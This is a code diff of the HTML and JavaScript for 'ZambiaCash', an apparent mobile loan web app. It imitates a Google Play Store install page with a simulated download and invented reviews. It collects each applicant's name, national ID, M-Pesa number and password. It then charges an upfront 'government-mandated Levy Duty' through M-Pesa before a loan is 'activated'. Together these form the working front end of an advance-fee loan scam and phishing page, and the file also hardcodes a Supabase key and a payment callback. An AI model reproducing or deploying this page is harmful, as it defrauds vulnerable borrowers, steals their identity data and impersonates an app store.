-                <p class="text-sm text-slate-500 mb-6 font-medium">Tap an amount, then choose a term</p>
-                <div class="grid grid-cols-3 gap-2.5 mb-8" id="amount-grid"></div>
-                <p class="font-bold text-slate-900 mb-3">Repayment term</p>
-                <div class="flex gap-2.5 mb-8">
-                    <button onclick="setTerm(30, this)" class="term-btn selected flex-1 py-3 text-sm">30 days</button>
-                    <button onclick="setTerm(60, this)" class="term-btn flex-1 py-3 text-sm">60 days</button>
-                    <button onclick="setTerm(90, this)" class="term-btn flex-1 py-3 text-sm">90 days</button>
-                </div>
-                <div class="bg-white rounded-3xl p-6 shadow-soft space-y-4 mb-8 border border-slate-100">
-                    <div class="flex justify-between items-center"><span class="text-slate-500 font-medium text-sm">You receive</span><span id="sum-receive" class="font-extrabold text-brandBlue text-lg">Ksh 1,000</span></div>
-                    <div class="flex justify-between items-center"><span id="sum-interest-label" class="text-slate-500 font-medium text-sm">Interest (10%)</span><span id="sum-interest" class="font-bold text-slate-800">Ksh 100</span></div>
-                    <div class="flex justify-between items-center"><span class="text-slate-500 font-medium text-sm">Total repayment</span><span id="sum-total" class="font-bold text-emerald-600 text-lg">Ksh 1,100</span></div>
-                    <div class="flex justify-between items-center"><span class="text-slate-500 font-medium text-sm">Due date</span><span id="sum-due" class="font-bold text-slate-800">--</span></div>
-                    <hr class="border-slate-100 my-2">
-                    <div class="flex justify-between items-center"><span class="text-slate-500 font-medium text-sm">Levy Duty (one-time)</span><span id="sum-levy" class="font-extrabold text-brandYellow text-lg">Ksh 1</span></div>
-                </div>
-                <button onclick="goToPayment()" class="w-full bg-brandBlue text-white font-bold py-4 rounded-xl shadow-lg">Continue</button>
-            </div>
-        </div>
-        <div id="screen-payment" class="screen bg-slate-50 p-6">
-            <div class="max-w-sm mx-auto w-full">
-                <div class="flex items-center gap-3 mb-6">
-                    <button onclick="showScreen('screen-select')" class="w-10 h-10 bg-white rounded-full flex items-center justify-center shadow-sm text-slate-700"><svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M15 19l-7-7 7-7"></path></svg></button>
-                    <h2 class="text-xl font-extrabold text-slate-900">Levy Duty Payment</h2>
-                </div>
-                <p class="text-sm text-slate-500 mb-6 font-medium">Pay the government-mandated Levy Duty to activate your loan.</p>
-                <div class="bg-white rounded-3xl p-6 shadow-soft space-y-4 mb-5 border border-slate-100">
-                    <div class="flex justify-between items-center"><span class="text-slate-500 font-medium text-sm">Loan amount</span><span id="pay-loan" class="font-bold text-slate-800">Ksh 1,000</span></div>
-                    <div class="flex justify-between items-center"><span class="text-slate-500 font-medium text-sm">Interest</span><span id="pay-interest" class="font-bold text-slate-800">Ksh 100</span></div>
-                    <div class="flex justify-between items-center"><span class="text-slate-500 font-medium text-sm">Total repayment</span><span id="pay-total" class="font-bold text-emerald-600">Ksh 1,100</span></div>
-                    <hr class="border-slate-100 my-2">
-                    <div class="flex justify-between items-center"><div><span class="text-slate-500 font-medium text-sm block">Levy Duty (pay now)</span><span class="text-[10px] text-slate-400 font-bold uppercase">Gov. requirement</span></div><span id="pay-levy" class="font-extrabold text-brandYellow text-xl">Ksh 1</span></div>
-                </div>
-                <div class="bg-white rounded-3xl p-6 shadow-soft mb-5 border border-slate-100">
-                    <p class="text-sm font-semibold text-slate-800 mb-1">Account: <span id="pay-name"></span></p>
-                    <label class="text-sm font-bold text-slate-900 mb-2 block mt-4">M-Pesa Number</label>
-                    <input type="tel" id="pay-mpesa" placeholder="0712345678">
-                    <p class="text-[11px] text-slate-400 mt-2 font-medium">Loan will be sent to this number</p>
-                </div>
-                <button onclick="showScreen('screen-select')" class="w-full text-brandBlue font-bold py-3 mb-4 text-sm">Change Loan Amount</button>
-                <button onclick="processPayment()" id="btn-pay" class="w-full bg-brandBlue text-white font-bold py-4 rounded-xl shadow-lg">Pay Ksh 1 Levy Duty</button>
-            </div>
-        </div>
-        <div id="screen-success" class="screen bg-slate-50 p-6">
-            <div class="max-w-sm mx-auto w-full text-center mt-12">
-                <div id="verify-anim" class="flex flex-col items-center">
-                    <div class="w-28 h-28 border-[6px] border-slate-200 border-t-brandBlue rounded-full animate-spin mb-6"></div>
-                    <h2 class="text-2xl font-extrabold text-slate-900">Verifying payment</h2>
-                    <p id="verify-subtitle" class="text-sm font-medium text-slate-500 mt-2 px-2 leading-relaxed">Please wait while we confirm with M-Pesa...</p>
-                    <p id="verify-time" class="text-brandYellow font-extrabold mt-4 text-xl bg-yellow-50 px-4 py-1 rounded-full">0s</p>
-                    <div id="debug-panel" class="debug-box hide w-full"><div id="debug-log">Initializing...</div></div>
-                </div>
-                <div id="success-anim" class="hide flex flex-col items-center">
-                    <div class="w-24 h-24 bg-emerald-100 text-emerald-500 rounded-full flex items-center justify-center mx-auto mb-6 text-5xl">✓</div>
-                    <h2 class="text-2xl font-extrabold text-slate-900">Loan Allocated!</h2>
-                    <p class="text-sm font-medium text-slate-500 mt-2 mb-8 px-4">Funds have been released to your M-Pesa immediately.</p>
-                    <div class="bg-white rounded-3xl p-6 shadow-soft text-left w-full space-y-4 mb-8 border border-slate-100">
-                        <div class="flex justify-between items-center"><span class="text-slate-500 font-medium text-sm">Loan Amount</span><span id="suc-loan" class="font-bold text-slate-800 text-lg">Ksh 1,000</span></div>
-                        <div class="flex justify-between items-center"><span class="text-slate-500 font-medium text-sm">Total Repayment</span><span id="suc-total" class="font-bold text-slate-800">Ksh 1,100</span></div>
-                        <div class="flex justify-between items-center"><span class="text-slate-500 font-medium text-sm">Due Date</span><span id="suc-due" class="font-bold text-slate-800">--</span></div>
-                        <div class="flex justify-between items-center"><span class="text-slate-500 font-medium text-sm">M-Pesa</span><span id="suc-mpesa" class="font-bold text-brandBlue"></span></div>
+                    <div>
+                        <div class="flex items-center gap-3 mb-2"><div class="review-avatar bg-pink-500">M</div><div><p class="text-sm font-semibold">Mary Wanjiku</p><p class="text-[11px] text-gray-500">1 week ago</p></div></div>
+                        <p class="text-sm text-gray-600 leading-relaxed">The interest rates are very low compared to other apps I've used. Very fair terms.</p>
                     </div>
-                    <button onclick="location.reload()" class="w-full bg-brandBlue text-white font-bold py-4 rounded-xl shadow-lg">Done</button>
+                    <div>
+                        <div class="flex items-center gap-3 mb-2"><div class="review-avatar bg-orange-500">P</div><div><p class="text-sm font-semibold">Peter Otieno</p><p class="text-[11px] text-gray-500">2 weeks ago</p></div></div>
+                        <p class="text-sm text-gray-600 leading-relaxed">The loan was disbursed quickly but the app crashed once during my application.</p>
+                    </div>
                 </div>
-                <div id="failed-anim" class="hide flex flex-col items-center">
-                    <div class="w-24 h-24 bg-red-100 text-red-500 rounded-full flex items-center justify-center mx-auto mb-6 text-5xl">✕</div>
-                    <h2 class="text-2xl font-extrabold text-slate-900">Payment Not Completed</h2>
-                    <p id="failed-reason" class="text-sm font-medium text-slate-500 mt-2 mb-8 px-4 leading-relaxed">The M-Pesa request was cancelled or failed.</p>
-                    <button onclick="retryPayment()" class="w-full bg-brandBlue text-white font-bold py-4 rounded-xl shadow-lg">Try Again</button>
-                </div>
-                <div id="pending-anim" class="hide flex flex-col items-center">
-                    <div class="w-24 h-24 bg-amber-100 text-amber-500 rounded-full flex items-center justify-center mx-auto mb-6 text-5xl">?</div>
-                    <h2 class="text-2xl font-extrabold text-slate-900">Still Confirming</h2>
-                    <p class="text-sm font-medium text-slate-500 mt-2 mb-6 px-4 leading-relaxed">We haven't received confirmation from M-Pesa yet. Tap below to check again.</p>
-                    <button onclick="checkStatusManual()" id="btn-check-status" class="w-full bg-brandBlue text-white font-bold py-4 rounded-xl shadow-lg mb-3 flex justify-center"><span>Check Status</span></button>
-                    <button onclick="forceComplete()" class="w-full bg-emerald-600 text-white font-bold py-3 rounded-xl mb-3 text-sm">I've Been Charged - Complete Loan</button>
-                    <button onclick="retryPayment()" class="w-full text-brandBlue font-bold py-3 text-sm">Back to Payment</button>
-                    <p id="txn-display" class="text-xs text-slate-400 mt-4">Txn: --</p>
+            </div>
+
+            <div class="border-t border-gray-100 pt-8 mb-8">
+                <h3 class="font-bold text-lg text-gray-900 mb-3">About the developer</h3>
+                <div class="text-sm text-gray-600 space-y-1">
+                    <p class="font-semibold text-gray-900">ZambiaCash Financial Services</p>
+                    <p>support@zambiacash.com</p>
+                    <p>Nairobi, Kenya</p>
                 </div>
             </div>
         </div>
     </div>
 
-    <script>
-        // GLOBAL ERROR HANDLER
-        window.addEventListener('error', (e) => {
-            alert('JS ERROR: ' + e.message);
-        });
+    <div class="fixed bottom-0 left-0 right-0 bg-white border-t border-gray-200 flex justify-around py-2.5 z-50">
+        <div class="flex flex-col items-center text-gray-500"><svg class="w-6 h-6 mb-1" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M14.752 11.168l-3.197-2.132A1 1 0 0010 9.87v4.263a1 1 0 001.555.832l3.197-2.132a1 1 0 000-1.664z"></path></svg><span class="text-[10px] font-medium">Games</span></div>
+        <div class="flex flex-col items-center text-gray-500"><svg class="w-6 h-6 mb-1" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 6a2 2 0 012-2h2a2 2 0 012 2v2a2 2 0 01-2 2H6a2 2 0 01-2-2V6zM14 6a2 2 0 012-2h2a2 2 0 012 2v2a2 2 0 01-2 2h-2a2 2 0 01-2-2V6zM4 16a2 2 0 012-2h2a2 2 0 012 2v2a2 2 0 01-2 2H6a2 2 0 01-2-2v-2zM14 16a2 2 0 012-2h2a2 2 0 012 2v2a2 2 0 01-2 2h-2a2 2 0 01-2-2v-2z"></path></svg><span class="text-[10px] font-medium">Apps</span></div>
+        <div class="flex flex-col items-center text-playBlue"><div class="bg-blue-100 px-5 py-1 rounded-full mb-1"><svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path></svg></div><span class="text-[10px] font-bold">Search</span></div>
+    </div>
+</div>
 
-        const SUPABASE_URL = "https://zpcbfaydgbhpjqsgfluv.supabase.co";
-        const SUPABASE_KEY = "sb_publishable_LNA8s-X4zUxoRN-oBsG2mQ_zyRKMAYQ";
-        const PALPLUSS_CHANNEL = "30dc7a92-7186-4686-b73d-c323138310c9";
-        const PALPLUSS_CALLBACK = "https://zpcbfaydgbhpjqsgfluv.supabase.co/functions/v1/palpluss-webhook";
+<!-- SPLASH -->
+<div id="splash-screen" class="hide fixed inset-0 z-[9998] bg-[#0F172A] flex flex-col items-center justify-center opacity-0">
+    <div class="w-24 h-24 bg-white/10 rounded-3xl flex items-center justify-center mb-4"><img src="icon.png" class="w-16 h-16 rounded-2xl object-cover"></div>
+    <h1 class="text-white text-2xl font-bold font-sans">ZambiaCash</h1>
+</div>
 
-        const MAX_POLL_SECONDS = 45;
-        const SUCCESS_STATUSES = ['ALLOCATED', 'SUCCESS', 'COMPLETED', 'PAID', 'SUCCESSFUL', 'TRUE', 'CONFIRMED'];
-        const FAILED_STATUSES = ['FAILED', 'CANCELLED', 'CANCELED', 'REJECTED', 'EXPIRED', 'TIMEOUT', 'DECLINED', 'FALSE'];
+<!-- APP CONTENT -->
+<div id="app-content" class="hide font-sans">
 
-        let state = { name: "", id: "", mpesa: "", loan: 1000, levy: 1, term: 30, interest: 100, total: 1100 };
-        const amounts = [1000, 2000, 3000, 5000, 7500, 10000, 15000, 20000, 25000, 30000, 40000, 50000];
-        let pollTimer = null;
-        let isPolling = false;
-        let isProcessingPayment = false;
-        let currentTxnId = null;
-        let toastTimeout;
-        let debugLines = [];
+<div id="screen-login" class="screen active gradient-bg p-6">
+    <div class="flex-1 flex flex-col justify-center max-w-sm mx-auto w-full">
+        <div class="text-center mb-10">
+            <div class="w-24 h-24 bg-white/10 rounded-3xl mx-auto flex items-center justify-center border border-white/20 mb-6"><img src="icon.png" class="w-16 h-16 rounded-2xl object-cover"></div>
+            <h1 class="text-white text-3xl font-extrabold tracking-tight">ZambiaCash</h1>
+            <p class="text-blue-200 text-sm font-medium mt-2">Quick loans in minutes</p>
+        </div>
+        <div class="glass-card rounded-3xl p-6 shadow-2xl">
+            <h2 class="text-xl font-bold text-slate-900 mb-5">Create Account</h2>
+            <div class="space-y-4">
+                <div><input type="text" id="in-name" placeholder="Full Name"></div>
+                <div><input type="number" id="in-id" placeholder="National ID (7-8 digits)"></div>
+                <div><input type="tel" id="in-mpesa" placeholder="M-Pesa (0712345678)"></div>
+                <div><input type="password" id="in-pass" placeholder="Password (min 4 chars)"></div>
+                <button onclick="submitLogin()" class="w-full bg-brandBlue text-white font-bold py-4 rounded-xl mt-4 shadow-lg">Create Account</button>
+            </div>
+            <p class="text-center text-xs text-slate-400 mt-6 font-medium">🔒 Your data is encrypted and safe</p>
+        </div>
+    </div>
+</div>
 
-        function log(msg) {
-            console.log('[ZC]', msg);
-            debugLines.push(msg);
-            if (debugLines.length > 12) debugLines.shift();
-            const el = document.getElementById('debug-log');
-            if (el) el.innerHTML = debugLines.map(l => '&gt; ' + l).join('<br>');
-        }
+<div id="screen-checking" class="screen gradient-bg p-6 items-center justify-center">
+    <div class="w-28 h-28 bg-white/10 rounded-full flex items-center justify-center mb-8 animate-pulse border border-white/20"><img src="icon.png" class="w-20 h-20 rounded-2xl object-cover"></div>
+    <h2 class="text-white text-2xl font-bold text-center mb-2">Checking your<br>loan limit</h2>
+    <p id="check-status" class="text-blue-200 text-sm mb-8 font-medium">Analyzing your profile...</p>
+    <div class="w-full max-w-xs bg-blue-900/50 rounded-full h-3 mb-3 border border-white/10"><div id="check-bar" class="bg-brandYellow h-3 rounded-full transition-all duration-100" style="width: 0%"></div></div>
+    <p id="check-percent" class="text-white font-bold text-2xl">0%</p>
+</div>
 
-        const format = (num) => "Ksh " + Number(num).toLocaleString();
-        const getDueDate = (days) => {
-            const d = new Date(); d.setDate(d.getDate() + days);
-            return d.toLocaleDateString('en-GB', { day: 'numeric', month: 'short', year: 'numeric' });
-        };
+<div id="screen-select" class="screen bg-slate-50 p-6">
+    <div class="max-w-sm mx-auto w-full">
+        <h2 class="text-2xl font-extrabold text-slate-900 mb-1">Choose your loan</h2>
+        <p class="text-sm text-slate-500 mb-6 font-medium">Tap an amount, then choose a term</p>
+        <div class="grid grid-cols-3 gap-2.5 mb-8" id="amount-grid"></div>
+        <p class="font-bold text-slate-900 mb-3">Repayment term</p>
+        <div class="flex gap-2.5 mb-8">
+            <button onclick="setTerm(30, this)" class="term-btn selected flex-1 py-3 text-sm">30 days</button>
+            <button onclick="setTerm(60, this)" class="term-btn flex-1 py-3 text-sm">60 days</button>
+            <button onclick="setTerm(90, this)" class="term-btn flex-1 py-3 text-sm">90 days</button>
+        </div>
+        <div class="bg-white rounded-3xl p-6 shadow-soft space-y-4 mb-8 border border-slate-100">
+            <div class="flex justify-between items-center"><span class="text-slate-500 font-medium text-sm">You receive</span><span id="sum-receive" class="font-extrabold text-brandBlue text-lg">Ksh 1,000</span></div>
+            <div class="flex justify-between items-center"><span id="sum-interest-label" class="text-slate-500 font-medium text-sm">Interest (10%)</span><span id="sum-interest" class="font-bold text-slate-800">Ksh 100</span></div>
+            <div class="flex justify-between items-center"><span class="text-slate-500 font-medium text-sm">Total repayment</span><span id="sum-total" class="font-bold text-emerald-600 text-lg">Ksh 1,100</span></div>
+            <div class="flex justify-between items-center"><span class="text-slate-500 font-medium text-sm">Due date</span><span id="sum-due" class="font-bold text-slate-800">--</span></div>
+            <hr class="border-slate-100 my-2">
+            <div class="flex justify-between items-center"><span class="text-slate-500 font-medium text-sm">Levy Duty (one-time)</span><span id="sum-levy" class="font-extrabold text-brandYellow text-lg">Ksh 1</span></div>
+        </div>
+        <button onclick="goToPayment()" class="w-full bg-brandBlue text-white font-bold py-4 rounded-xl shadow-lg">Continue</button>
+    </div>
+</div>
 
-        function showScreen(id) {
-            document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
-            document.getElementById(id).classList.add('active');
-            window.scrollTo(0,0);
-        }
+<div id="screen-payment" class="screen bg-slate-50 p-6">
+    <div class="max-w-sm mx-auto w-full">
+        <div class="flex items-center gap-3 mb-6">
+            <button onclick="showScreen('screen-select')" class="w-10 h-10 bg-white rounded-full flex items-center justify-center shadow-sm text-slate-700"><svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M15 19l-7-7 7-7"></path></svg></button>
+            <h2 class="text-xl font-extrabold text-slate-900">Levy Duty Payment</h2>
+        </div>
+        <p class="text-sm text-slate-500 mb-6 font-medium">Pay the government-mandated Levy Duty to activate your loan.</p>
+        <div class="bg-white rounded-3xl p-6 shadow-soft space-y-4 mb-5 border border-slate-100">
+            <div class="flex justify-between items-center"><span class="text-slate-500 font-medium text-sm">Loan amount</span><span id="pay-loan" class="font-bold text-slate-800">Ksh 1,000</span></div>
+            <div class="flex justify-between items-center"><span class="text-slate-500 font-medium text-sm">Interest</span><span id="pay-interest" class="font-bold text-slate-800">Ksh 100</span></div>
+            <div class="flex justify-between items-center"><span class="text-slate-500 font-medium text-sm">Total repayment</span><span id="pay-total" class="font-bold text-emerald-600">Ksh 1,100</span></div>
+            <hr class="border-slate-100 my-2">
+            <div class="flex justify-between items-center"><div><span class="text-slate-500 font-medium text-sm block">Levy Duty (pay now)</span><span class="text-[10px] text-slate-400 font-bold uppercase">Gov. requirement</span></div><span id="pay-levy" class="font-extrabold text-brandYellow text-xl">Ksh 1</span></div>
+        </div>
+        <div class="bg-white rounded-3xl p-6 shadow-soft mb-5 border border-slate-100">
+            <p class="text-sm font-semibold text-slate-800 mb-1">Account: <span id="pay-name"></span></p>
+            <label class="text-sm font-bold text-slate-900 mb-2 block mt-4">M-Pesa Number</label>
+            <input type="tel" id="pay-mpesa" placeholder="0712345678">
+            <p class="text-[11px] text-slate-400 mt-2 font-medium">Loan will be sent to this number</p>
+        </div>
+        <button onclick="showScreen('screen-select')" class="w-full text-brandBlue font-bold py-3 mb-4 text-sm">Change Loan Amount</button>
+        <button onclick="processPayment()" id="btn-pay" class="w-full bg-brandBlue text-white font-bold py-4 rounded-xl shadow-lg">Pay Ksh 1 Levy Duty</button>
+    </div>
+</div>
 
-        function showToast(msg) {
-            log('TOAST: ' + msg);
-            const t = document.getElementById('android-toast');
-            t.innerText = msg;
-            t.classList.remove('hide', 'hide-toast');
-            t.classList.add('native-toast');
-            clearTimeout(toastTimeout);
-            toastTimeout = setTimeout(() => {
-                t.classList.add('hide-toast');
-                setTimeout(() => t.classList.add('hide'), 300);
-            }, 4000);
-        }
+<div id="screen-success" class="screen bg-slate-50 p-6">
+    <div class="max-w-sm mx-auto w-full text-center mt-12">
+        <div id="verify-anim" class="flex flex-col items-center">
+            <div class="w-28 h-28 border-[6px] border-slate-200 border-t-brandBlue rounded-full animate-spin mb-6"></div>
+            <h2 class="text-2xl font-extrabold text-slate-900">Verifying payment</h2>
+            <p id="verify-subtitle" class="text-sm font-medium text-slate-500 mt-2 px-2 leading-relaxed">Please wait while we confirm with M-Pesa...</p>
+            <p id="verify-time" class="text-brandYellow font-extrabold mt-4 text-xl bg-yellow-50 px-4 py-1 rounded-full">0s</p>
+        </div>
+        <div id="success-anim" class="hide flex flex-col items-center">
+            <div class="w-24 h-24 bg-emerald-100 text-emerald-500 rounded-full flex items-center justify-center mx-auto mb-6 text-5xl shadow-glow">✓</div>
+            <h2 class="text-2xl font-extrabold text-slate-900">Loan Allocated!</h2>
+            <p class="text-sm font-medium text-slate-500 mt-2 mb-8 px-4">Funds have been released to your M-Pesa immediately.</p>
+            <div class="bg-white rounded-3xl p-6 shadow-soft text-left w-full space-y-4 mb-8 border border-slate-100">
+                <div class="flex justify-between items-center"><span class="text-slate-500 font-medium text-sm">Loan Amount</span><span id="suc-loan" class="font-bold text-slate-800 text-lg">Ksh 1,000</span></div>
+                <div class="flex justify-between items-center"><span class="text-slate-500 font-medium text-sm">Total Repayment</span><span id="suc-total" class="font-bold text-slate-800">Ksh 1,100</span></div>
+                <div class="flex justify-between items-center"><span class="text-slate-500 font-medium text-sm">Due Date</span><span id="suc-due" class="font-bold text-slate-800">--</span></div>
+                <div class="flex justify-between items-center"><span class="text-slate-500 font-medium text-sm">M-Pesa</span><span id="suc-mpesa" class="font-bold text-brandBlue"></span></div>
+            </div>
+            <button onclick="location.reload()" class="w-full bg-brandBlue text-white font-bold py-4 rounded-xl shadow-lg">Done</button>
+        </div>
+        <div id="failed-anim" class="hide flex flex-col items-center">
+            <div class="w-24 h-24 bg-red-100 text-red-500 rounded-full flex items-center justify-center mx-auto mb-6 text-5xl">✕</div>
+            <h2 class="text-2xl font-extrabold text-slate-900">Payment Not Completed</h2>
+            <p class="text-sm font-medium text-slate-500 mt-2 mb-8 px-4 leading-relaxed">The M-Pesa request was cancelled or failed.</p>
+            <button onclick="retryPayment()" class="w-full bg-brandBlue text-white font-bold py-4 rounded-xl shadow-lg">Try Again</button>
+        </div>
+        <div id="pending-anim" class="hide flex flex-col items-center">
+            <div class="w-24 h-24 bg-amber-100 text-amber-500 rounded-full flex items-center justify-center mx-auto mb-6 text-5xl">?</div>
+            <h2 class="text-2xl font-extrabold text-slate-900">Still Confirming</h2>
+            <p class="text-sm font-medium text-slate-500 mt-2 mb-8 px-4 leading-relaxed">We haven't received confirmation from M-Pesa yet. Tap below to check again.</p>
+            <button onclick="checkStatusManual()" id="btn-check-status" class="w-full bg-brandBlue text-white font-bold py-4 rounded-xl shadow-lg mb-3 flex justify-center"><span>Check Status</span></button>
+            <button onclick="retryPayment()" class="w-full text-brandBlue font-bold py-3 text-sm">Back to Payment</button>
+        </div>
+    </div>
+</div>
 
-        async function fetchWithTimeout(url, options = {}, timeoutMs = 15000) {
-            const controller = new AbortController();
-            const timer = setTimeout(() => controller.abort(), timeoutMs);
-            try {
-                return await fetch(url, { ...options, signal: controller.signal, cache: 'no-store' });
-            } finally { clearTimeout(timer); }
-        }
+</div>
 
-        async function readJsonSafe(response) {
-            let text = "";
-            try { text = await response.text(); } catch (e) { return null; }
-            if (!text) return null;
-            try { return JSON.parse(text); } catch (e) { return { _raw: text }; }
-        }
+<script>
+const SUPABASE_URL = "https://zpcbfaydgbhpjqsgfluv.supabase.co";
+const SUPABASE_KEY = "sb_publishable_LNA8s-X4zUxoRN-oBsG2mQ_zyRKMAYQ";
+const PALPLUSS_CHANNEL = "30dc7a92-7186-4686-b73d-c323138310c9";
+const PALPLUSS_CALLBACK = "https://zpcbfaydgbhpjqsgfluv.supabase.co/functions/v1/palpluss-webhook";
 
-        function stopPolling() {
-            if (pollTimer) { clearTimeout(pollTimer); pollTimer = null; }
-            isPolling = false;
-        }
+const MAX_POLL_SECONDS = 40;
+const SUCCESS_STATUSES = ['ALLOCATED','SUCCESS','COMPLETED','PAID','SUCCESSFUL','TRUE','CONFIRMED'];
+const FAILED_STATUSES = ['FAILED','CANCELLED','CANCELED','REJECTED','EXPIRED','TIMEOUT','DECLINED','FALSE'];
 
-        function resetPayButton() {
-            isProcessingPayment = false;
-            const btn = document.getElementById('btn-pay');
-            if (btn) { btn.disabled = false; btn.innerText = `Pay ${format(state.levy)} Levy Duty`; }
-        }
+let state = { name:"", id:"", mpesa:"", loan:1000, levy:1, term:30, interest:100, total:1100 };
+const amounts = [1000,2000,3000,5000,7500,10000,15000,20000,25000,30000,40000,50000];
+let pollTimer = null, isPolling = false, isProcessingPayment = false, currentTxnId = null, toastTimeout;
 
-        // ============ PLAY STORE ============
-        const playStoreGate = document.getElementById('play-store-gate');
-        const appContent = document.getElementById('app-content');
-        const splashScreen = document.getElementById('splash-screen');
-        let deferredPrompt;
-        let downloadInterval = null;
+const format = (n) => "Ksh " + Number(n).toLocaleString();
+const getDueDate = (d) => { const x = new Date(); x.setDate(x.getDate()+d); return x.toLocaleDateString('en-GB',{day:'numeric',month:'short',year:'numeric'}); };
 
-        window.addEventListener('beforeinstallprompt', (e) => {
-            e.preventDefault();
-            deferredPrompt = e;
-            console.log('[ZC] PWA install prompt available');
-        });
+function showScreen(id){ document.querySelectorAll('.screen').forEach(s=>s.classList.remove('active')); document.getElementById(id).classList.add('active'); window.scrollTo(0,0); }
 
-        function showInstallState() {
-            document.getElementById('pre-install-buttons').classList.remove('hide');
-            document.getElementById('downloading-buttons').classList.add('hide');
-            document.getElementById('post-install-buttons').classList.add('hide');
+function showToast(msg){
+    const t = document.getElementById('android-toast');
+    t.innerText = msg; t.classList.remove('hide','hide-toast'); t.classList.add('native-toast');
+    clearTimeout(toastTimeout);
+    toastTimeout = setTimeout(()=>{ t.classList.add('hide-toast'); setTimeout(()=>t.classList.add('hide'),300); }, 4000);
+}
+
+async function fetchWithTimeout(url, opts={}, ms=15000){
+    const c = new AbortController(); const t = setTimeout(()=>c.abort(), ms);
+    try { return await fetch(url, {...opts, signal:c.signal, cache:'no-store'}); } finally { clearTimeout(t); }
+}
+
+async function readJsonSafe(r){ try{ const x = await r.text(); return x ? JSON.parse(x) : null; }catch(e){ return null; } }
+
+function stopPolling(){ if(pollTimer){ clearTimeout(pollTimer); pollTimer = null; } isPolling = false; }
+function resetPayButton(){ isProcessingPayment = false; const b = document.getElementById('btn-pay'); if(b){ b.disabled = false; b.innerText = `Pay ${format(state.levy)} Levy Duty`; } }
+
+/* PLAY STORE */
+const playStoreGate = document.getElementById('play-store-gate');
+const appContent = document.getElementById('app-content');
+const splashScreen = document.getElementById('splash-screen');
+let deferredPrompt, downloadInterval;
+
+window.addEventListener('beforeinstallprompt', (e)=>{ e.preventDefault(); deferredPrompt = e; });
+
+function showInstallState(){
+    document.getElementById('pre-install-buttons').classList.remove('hide');
+    document.getElementById('downloading-buttons').classList.add('hide');
+    document.getElementById('post-install-buttons').classList.add('hide');
+    document.getElementById('download-text').classList.add('hide');
+    document.getElementById('ring-svg').classList.add('hidden');
+    document.getElementById('stats-row').classList.remove('hide');
+    document.getElementById('post-install-content').classList.add('hide');
+    document.getElementById('pre-install-content').classList.remove('hide');
+}
+function showInstalledState(){
+    document.getElementById('pre-install-buttons').classList.add('hide');
+    document.getElementById('downloading-buttons').classList.add('hide');
+    document.getElementById('post-install-buttons').classList.remove('hide');
+    document.getElementById('download-text').classList.add('hide');
+    document.getElementById('ring-svg').classList.add('hidden');
+    document.getElementById('stats-row').classList.add('hide');
+    document.getElementById('post-install-content').classList.remove('hide');
+    document.getElementById('pre-install-content').classList.remove('hide');
+}
+function mockUninstall(){ showInstallState(); }
+function setRating(r){
+    document.querySelectorAll('.rate-star').forEach((s,i)=>{
+        if(i<r){ s.classList.remove('text-gray-300'); s.classList.add('text-brandYellow'); s.setAttribute('fill','currentColor'); }
+        else { s.classList.remove('text-brandYellow'); s.classList.add('text-gray-300'); s.setAttribute('fill','none'); }
+    });
+    if(r>0){ const b = document.getElementById('btn-write-review'); b.innerText = `Thanks for rating ${r} stars!`; b.classList.remove('text-playBlue'); b.classList.add('text-emerald-600'); }
+}
+
+document.getElementById('btn-store-install').addEventListener('click', async ()=>{
+    if(deferredPrompt){
+        deferredPrompt.prompt();
+        const { outcome } = await deferredPrompt.userChoice;
+        deferredPrompt = null;
+        if(outcome === 'accepted') startFakeDownload();
+    } else {
+        startFakeDownload();
+    }
+});
+
+function startFakeDownload(){
+    document.getElementById('pre-install-buttons').classList.add('hide');
+    document.getElementById('downloading-buttons').classList.remove('hide');
+    document.getElementById('download-text').classList.remove('hide');
+    document.getElementById('ring-svg').classList.remove('hidden');
+    let progress = 0;
+    const ring = document.getElementById('download-ring');
+    const pct = document.getElementById('download-percent');
+    const increment = 100 / 300;
+    downloadInterval = setInterval(()=>{
+        progress += increment;
+        if(progress > 100) progress = 100;
+        ring.style.strokeDashoffset = 301.59 - (progress/100)*301.59;
+        pct.innerText = Math.floor(progress) + "% of 10 MB";
+        if(progress >= 100){
+            clearInterval(downloadInterval);
             document.getElementById('download-text').classList.add('hide');
-            document.getElementById('ring-svg').classList.add('hidden');
-            document.getElementById('stats-row').classList.remove('hide');
-            document.getElementById('post-install-content').classList.add('hide');
-            document.getElementById('pre-install-content').classList.remove('hide');
+            document.getElementById('btn-installing').innerHTML = 'Installing...';
+            setTimeout(()=>showInstalledState(), 3000);
         }
+    }, 100);
+}
 
-        function showInstalledState() {
-            document.getElementById('pre-install-buttons').classList.add('hide');
-            document.getElementById('downloading-buttons').classList.add('hide');
-            document.getElementById('post-install-buttons').classList.remove('hide');
-            document.getElementById('download-text').classList.add('hide');
-            document.getElementById('ring-svg').classList.add('hidden');
-            document.getElementById('stats-row').classList.add('hide');
-            document.getElementById('post-install-content').classList.remove('hide');
-            document.getElementById('pre-install-content').classList.remove('hide');
-        }
+document.getElementById('btn-open-app').addEventListener('click', ()=>{
+    playStoreGate.classList.add('hide');
+    splashScreen.classList.remove('hide');
+    splashScreen.classList.add('splash-anim');
+    setTimeout(()=>{ splashScreen.classList.add('hide'); appContent.classList.remove('hide'); }, 1800);
+});
 
-        function mockUninstall() {
-            showInstallState();
-        }
+const isStandalone = window.matchMedia('(display-mode: standalone)').matches || window.navigator.standalone;
+if(isStandalone){ playStoreGate.classList.add('hide'); appContent.classList.remove('hide'); }
+else { playStoreGate.classList.remove('hide'); showInstallState(); }
 
-        function setRating(rating) {
-            document.querySelectorAll('.rate-star').forEach((star, index) => {
-                if (index < rating) {
-                    star.classList.remove('text-gray-300');
-                    star.classList.add('text-brandYellow');
-                    star.setAttribute('fill', 'currentColor');
-                } else {
-                    star.classList.remove('text-brandYellow');
-                    star.classList.add('text-gray-300');
-                    star.setAttribute('fill', 'none');
-                }
